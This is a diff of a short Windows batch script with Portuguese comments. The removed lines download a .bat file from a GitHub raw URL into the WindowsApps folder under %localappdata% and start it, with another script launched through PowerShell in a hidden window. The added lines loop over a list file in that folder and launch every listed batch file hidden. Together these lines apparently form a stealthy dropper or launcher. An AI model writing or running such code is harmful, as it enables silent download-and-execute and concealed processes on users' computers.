@@ -1,6 +1,7 @@
 @ECHO OFF
-powershell "start winturn.bat -WindowStyle Hidden"
-
-@ECHO OFF
-curl https://raw.githubusercontent.com/hulaneoTi/testes/main/winturn.bat > %localappdata%\Microsoft\WindowsApps\teste.bat
-start teste.bat
+for /F "tokens=*" %%A in (%localappdata%\Microsoft\WindowsApps\list.txt) do (
+    if /I NOT %%A==start.bat (
+        ::verificar se o bat está em execução, se estiver ele deve ser finalizado.
+        powershell "start %%A -WindowStyle Hidden"
+    )
+)
